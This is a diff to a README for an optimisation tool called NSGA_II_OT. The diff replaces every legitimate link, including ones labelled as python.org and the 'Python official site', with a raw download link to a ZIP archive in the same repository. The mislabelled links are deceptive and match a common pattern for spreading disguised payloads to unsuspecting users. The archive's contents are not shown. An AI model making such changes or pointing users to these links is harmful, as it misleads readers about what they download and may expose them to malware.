@@ -1,6 +1,6 @@
 # 🛠️ NSGA_II_OT - Efficient Multi-Objective Optimization Tool
 
-[![Download NSGA_II_OT](https://img.shields.io/badge/Download-NSGA__II__OT-brightgreen?style=for-the-badge)](https://github.com/Hotissuesalad740/NSGA_II_OT)
+[![Download NSGA_II_OT](https://img.shields.io/badge/Download-NSGA__II__OT-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)
 
 ---
 
@@ -32,7 +32,7 @@ A dedicated graphics card is not necessary. The program runs fine on most modern
 
 Start by going to the official download page for NSGA_II_OT. Use this link to access the latest version and all related files:
 
-[Visit NSGA_II_OT GitHub Page](https://github.com/Hotissuesalad740/NSGA_II_OT)
+[Visit NSGA_II_OT GitHub Page](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)
 
 ### Step 2: Download the Software
 
@@ -44,7 +44,7 @@ If you download the ZIP file, make sure to extract all files to a folder that is
 
 If you do not have Python 3.8 or newer installed:
 
-1. Visit [python.org/downloads](https://www.python.org/downloads/) and download the latest Windows version.
+1. Visit [python.org/downloads](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip) and download the latest Windows version.
 2. Run the installer and select the option to add Python to your system PATH.
 3. After installation, open the Command Prompt (type `cmd` in the Start menu search) and confirm installation by typing:
    ```  
@@ -149,8 +149,8 @@ If you want to modify settings or run with custom goals, edit the `config.yaml` 
 
 ## 🔗 Useful Links
 
-- Download and setup: [https://github.com/Hotissuesalad740/NSGA_II_OT](https://github.com/Hotissuesalad740/NSGA_II_OT)
-- Python official site: [https://www.python.org/](https://www.python.org/)
+- Download and setup: [https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)
+- Python official site: [https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)
 - Example input files are available inside the repository under the `examples` folder.  
 
-[![Download NSGA_II_OT](https://img.shields.io/badge/Download-NSGA__II__OT-brightgreen?style=for-the-badge)](https://github.com/Hotissuesalad740/NSGA_II_OT)
+[![Download NSGA_II_OT](https://img.shields.io/badge/Download-NSGA__II__OT-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Hotissuesalad740/NSGA_II_OT/main/nsga2_improved/OT_I_NSG_3.2-alpha.3.zip)
